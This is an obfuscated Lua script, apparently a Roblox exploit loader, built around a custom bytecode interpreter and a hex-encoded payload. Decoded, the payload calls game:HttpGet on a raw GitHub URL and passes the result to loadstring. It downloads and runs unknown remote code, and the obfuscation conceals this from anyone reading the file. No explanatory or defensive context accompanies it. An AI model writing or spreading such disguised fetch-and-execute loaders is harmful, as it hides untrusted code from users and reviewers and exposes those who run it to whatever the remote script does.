--[[
    obfuscated by Turtle Secure
]]

local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 36) then
					if (Enum <= 17) then
						if (Enum <= 8) then
							if (Enum <= 3) then
								if (Enum <= 1) then
									if (Enum == 0) then
										Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
									else
										Stk[Inst[2]] = Stk[Inst[3]] - Stk[Inst[4]];
									end
								elseif (Enum == 2) then
									if (Inst[2] < Stk[Inst[4]]) then
										VIP = VIP + 1;
									else
										VIP = Inst[3];
									end
								else
									Stk[Inst[2]] = Inst[3];
								end
							elseif (Enum <= 5) then
								if (Enum > 4) then
									local A = Inst[2];
									local B = Stk[Inst[3]];
									Stk[A + 1] = B;
									Stk[A] = B[Inst[4]];
								else
									Stk[Inst[2]] = {};
								end
							elseif (Enum <= 6) then
								if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
									Stk[Inst[2]] = Env;
								else
									Stk[Inst[2]] = Env[Inst[3]];
								end
							elseif (Enum > 7) then
								if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
									Stk[Inst[2]] = Env;
								else
									Stk[Inst[2]] = Env[Inst[3]];
								end
							else
								Stk[Inst[2]] = Stk[Inst[3]];
							end
						elseif (Enum <= 12) then
							if (Enum <= 10) then
								if (Enum == 9) then
									if (Inst[2] < Stk[Inst[4]]) then
										VIP = VIP + 1;
									else
										VIP = Inst[3];
									end
								elseif (Stk[Inst[2]] == Inst[4]) then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							elseif (Enum > 11) then
								if (Stk[Inst[2]] < Inst[4]) then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							else
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							end
						elseif (Enum <= 14) then
							if (Enum == 13) then
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							else
								local A = Inst[2];
								local Step = Stk[A + 2];
								local Index = Stk[A] + Step;
								Stk[A] = Index;
								if (Step > 0) then
									if (Index <= Stk[A + 1]) then
										VIP = Inst[3];
										Stk[A + 3] = Index;
									end
								elseif (Index >= Stk[A + 1]) then
									VIP = Inst[3];
									Stk[A + 3] = Index;
								end
							end
						elseif (Enum <= 15) then
							Stk[Inst[2]] = Inst[3] ^ Stk[Inst[4]];
						elseif (Enum == 16) then
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						else
							Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
						end
					elseif (Enum <= 26) then
						if (Enum <= 21) then
							if (Enum <= 19) then
								if (Enum == 18) then
									Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
								else
									local A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
								end
							elseif (Enum == 20) then
								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
							elseif (Stk[Inst[2]] < Inst[4]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum <= 23) then
							if (Enum > 22) then
								Stk[Inst[2]] = Upvalues[Inst[3]];
							else
								Stk[Inst[2]] = Stk[Inst[3]] / Inst[4];
							end
						elseif (Enum <= 24) then
							do
								return;
							end
						elseif (Enum == 25) then
							local A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
						else
							local A = Inst[2];
							do
								return Unpack(Stk, A, Top);
							end
						end
					elseif (Enum <= 31) then
						if (Enum <= 28) then
							if (Enum == 27) then
								do
									return Stk[Inst[2]];
								end
							else
								Stk[Inst[2]] = -Stk[Inst[3]];
							end
						elseif (Enum <= 29) then
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 46) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						elseif (Enum == 30) then
							local A = Inst[2];
							do
								return Stk[A](Unpack(Stk, A + 1, Inst[3]));
							end
						else
							Stk[Inst[2]] = Stk[Inst[3]] - Stk[Inst[4]];
						end
					elseif (Enum <= 33) then
						if (Enum > 32) then
							Stk[Inst[2]] = Stk[Inst[3]] * Stk[Inst[4]];
						else
							Stk[Inst[2]] = {};
						end
					elseif (Enum <= 34) then
						Env[Inst[3]] = Stk[Inst[2]];
					elseif (Enum == 35) then
						Stk[Inst[2]] = Inst[3] * Stk[Inst[4]];
					else
						local A = Inst[2];
						local Step = Stk[A + 2];
						local Index = Stk[A] + Step;
						Stk[A] = Index;
						if (Step > 0) then
							if (Index <= Stk[A + 1]) then
								VIP = Inst[3];
								Stk[A + 3] = Index;
							end
						elseif (Index >= Stk[A + 1]) then
							VIP = Inst[3];
							Stk[A + 3] = Index;
						end
					end
				elseif (Enum <= 55) then
					if (Enum <= 45) then
						if (Enum <= 40) then
							if (Enum <= 38) then
								if (Enum == 37) then
									Stk[Inst[2]] = Stk[Inst[3]] - Inst[4];
								else
									Stk[Inst[2]]();
								end
							elseif (Enum > 39) then
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							elseif (Inst[2] <= Stk[Inst[4]]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum <= 42) then
							if (Enum > 41) then
								local A = Inst[2];
								local Index = Stk[A];
								local Step = Stk[A + 2];
								if (Step > 0) then
									if (Index > Stk[A + 1]) then
										VIP = Inst[3];
									else
										Stk[A + 3] = Index;
									end
								elseif (Index < Stk[A + 1]) then
									VIP = Inst[3];
								else
									Stk[A + 3] = Index;
								end
							else
								Stk[Inst[2]] = -Stk[Inst[3]];
							end
						elseif (Enum <= 43) then
							Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
						elseif (Enum > 44) then
							Stk[Inst[2]] = Upvalues[Inst[3]];
						elseif (Stk[Inst[2]] <= Stk[Inst[4]]) then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif (Enum <= 50) then
						if (Enum <= 47) then
							if (Enum > 46) then
								local A = Inst[2];
								do
									return Unpack(Stk, A, Top);
								end
							else
								Stk[Inst[2]] = Stk[Inst[3]];
							end
						elseif (Enum <= 48) then
							VIP = Inst[3];
						elseif (Enum > 49) then
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						else
							Stk[Inst[2]] = Stk[Inst[3]] + Stk[Inst[4]];
						end
					elseif (Enum <= 52) then
						if (Enum > 51) then
							Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
						else
							Stk[Inst[2]] = Stk[Inst[3]] - Inst[4];
						end
					elseif (Enum <= 53) then
						local A = Inst[2];
						do
							return Unpack(Stk, A, A + Inst[3]);
						end
					elseif (Enum == 54) then
						local A = Inst[2];
						do
							return Stk[A](Unpack(Stk, A + 1, Inst[3]));
						end
					else
						local A = Inst[2];
						local Index = Stk[A];
						local Step = Stk[A + 2];
						if (Step > 0) then
							if (Index > Stk[A + 1]) then
								VIP = Inst[3];
							else
								Stk[A + 3] = Index;
							end
						elseif (Index < Stk[A + 1]) then
							VIP = Inst[3];
						else
							Stk[A + 3] = Index;
						end
					end
				elseif (Enum <= 64) then
					if (Enum <= 59) then
						if (Enum <= 57) then
							if (Enum > 56) then
								Stk[Inst[2]] = Inst[3] * Stk[Inst[4]];
							else
								Stk[Inst[2]] = Inst[3] ^ Stk[Inst[4]];
							end
						elseif (Enum == 58) then
							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						else
							Stk[Inst[2]] = Stk[Inst[3]] + Stk[Inst[4]];
						end
					elseif (Enum <= 61) then
						if (Enum > 60) then
							Env[Inst[3]] = Stk[Inst[2]];
						elseif (Stk[Inst[2]] == Inst[4]) then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif (Enum <= 62) then
						Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
					elseif (Enum > 63) then
						do
							return Stk[Inst[2]];
						end
					elseif (Stk[Inst[2]] <= Stk[Inst[4]]) then
						VIP = VIP + 1;
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 69) then
					if (Enum <= 66) then
						if (Enum == 65) then
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 46) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						elseif (Inst[2] <= Stk[Inst[4]]) then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif (Enum <= 67) then
						Stk[Inst[2]] = Stk[Inst[3]] / Inst[4];
					elseif (Enum == 68) then
						Stk[Inst[2]]();
					else
						do
							return;
						end
					end
				elseif (Enum <= 71) then
					if (Enum == 70) then
						local A = Inst[2];
						Stk[A] = Stk[A](Stk[A + 1]);
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 72) then
					local A = Inst[2];
					Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
				elseif (Enum > 73) then
					Stk[Inst[2]] = Inst[3];
				else
					Stk[Inst[2]] = Stk[Inst[3]] * Stk[Inst[4]];
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
VMCall("LOL!0E3O0003053O006269743332026O002O40027O004003043O00626E6F7403043O0062616E642O033O00626F7203043O0062786F7203063O006C736869667403063O0072736869667403073O0061727368696674030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403473O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F53696468736B736A736A73682F457865637574652D5363726970742F6D61696E2F2E6C7561002E4O00207O00123D3O00013O0012033O00023O001038000100033O001206000200013O00061D00033O000100012O002E3O00013O001014000200040003001206000200013O00061D00030001000100022O002E3O00014O002E7O001014000200050003001206000200013O00061D00030002000100022O002E3O00014O002E7O001014000200060003001206000200013O00061D00030003000100022O002E3O00014O002E7O001014000200070003001206000200013O00061D00030004000100022O002E8O002E3O00013O001014000200080003001206000200013O00061D00030005000100022O002E8O002E3O00013O001014000200090003001206000200013O00061D00030006000100022O002E8O002E3O00013O0010140002000A00030012060002000B3O0012060003000C3O00200B00030003000D0012030005000E4O000D000300054O001300023O00022O00440002000100012O00183O00013O00073O00013O00026O00F03F01074O001700016O002B5O00012O001700015O0020330001000100012O0001000100014O0040000100024O00183O00017O000B3O00025O00E06F40026O007040024O00E0FFEF40026O00F040022O00E03OFFEF41026O00F041028O00026O00F03F027O004003043O006D61746803053O00666C2O6F72022B3O00260A00010004000100010004473O0004000100202O00023O00022O0040000200023O00260A00010008000100030004473O0008000100202O00023O00042O0040000200023O00260A0001000C000100050004473O000C000100202O00023O00062O0040000200024O001700026O002B00023O00022O001700036O002B0001000100032O00073O00023O001203000200073O001203000300083O001203000400084O0017000500013O001203000600083O00043700040029000100202O00083O000900202O000900010009001206000A000A3O002032000A000A000B002016000B3O00092O0019000A00020002001206000B000A3O002032000B000B000B002016000C000100092O0019000B000200022O00070001000B4O00073O000A4O0031000A0008000900260A000A0027000100090004473O002700012O003100020002000300103900030009000300040E0004001700012O0040000200024O00183O00017O000A3O00025O00E06F40026O007040024O00E0FFEF40026O00F040022O00E03OFFEF41028O00026O00F03F027O004003043O006D61746803053O00666C2O6F72022F3O00260A00010006000100010004473O0006000100202O00023O00022O000100023O00020020120002000200012O0040000200023O00260A0001000C000100030004473O000C000100202O00023O00042O000100023O00020020120002000200032O0040000200023O00260A00010010000100050004473O00100001001203000200054O0040000200024O001700026O002B00023O00022O001700036O002B0001000100032O00073O00023O001203000200063O001203000300073O001203000400074O0017000500013O001203000600073O0004370004002D000100202O00083O000800202O000900010008001206000A00093O002032000A000A000A002016000B3O00082O0019000A00020002001206000B00093O002032000B000B000A002016000C000100082O0019000B000200022O00070001000B4O00073O000A4O0031000A00080009000E420007002B0001000A0004473O002B00012O003100020002000300103900030008000300040E0004001B00012O0040000200024O00183O00017O00053O00028O00026O00F03F027O004003043O006D61746803053O00666C2O6F72021F4O001700026O002B00023O00022O001700036O002B0001000100032O00073O00023O001203000200013O001203000300023O001203000400024O0017000500013O001203000600023O0004370004001D000100202O00083O000300202O000900010003001206000A00043O002032000A000A0005002016000B3O00032O0019000A00020002001206000B00043O002032000B000B0005002016000C000100032O0019000B000200022O00070001000B4O00073O000A4O0031000A0008000900260A000A001B000100020004473O001B00012O003100020002000300103900030003000300040E0004000B00012O0040000200024O00183O00017O00053O0003043O006D6174682O033O00616273028O0003053O00666C2O6F72027O0040021A3O001206000200013O0020320002000200022O0007000300014O00190002000200022O001700035O00063F00030009000100020004473O00090001001203000200034O0040000200024O0017000200014O002B5O000200260C00010014000100030004473O00140001001206000200013O0020320002000200040010380003000500012O004900033O00032O0036000200034O001A00025O0004473O001900010010380002000500012O004900023O00022O0017000300014O002B0002000200032O0040000200024O00183O00017O00053O0003043O006D6174682O033O00616273028O0003053O00666C2O6F72027O0040021C3O001206000200013O0020320002000200022O0007000300014O00190002000200022O001700035O00063F00030009000100020004473O00090001001203000200034O0040000200024O0017000200014O002B5O0002000E0200030015000100010004473O00150001001206000200013O0020320002000200042O001C000300013O0010380003000500032O004900033O00032O0036000200034O001A00025O0004473O001B00012O001C000200013O0010380002000500022O004900023O00022O0017000300014O002B0002000200032O0040000200024O00183O00017O00053O0003043O006D6174682O033O00616273028O00027O004003053O00666C2O6F7202273O001206000200013O0020320002000200022O0007000300014O00190002000200022O001700035O00063F00030009000100020004473O00090001001203000200034O0040000200024O0017000200014O002B5O0002000E0200030020000100010004473O00200001001203000200034O0017000300013O00201600030003000400063F0003001700013O0004473O001700012O0017000300014O001700046O00010004000400010010380004000400042O0001000200030004001206000300013O0020320003000300052O001C000400013O0010380004000400042O004900043O00042O00190003000200022O00310003000300022O0040000300023O0004473O002600012O001C000200013O0010380002000400022O004900023O00022O0017000300014O002B0002000200032O0040000200024O00183O00017O00", GetFEnv(), ...);
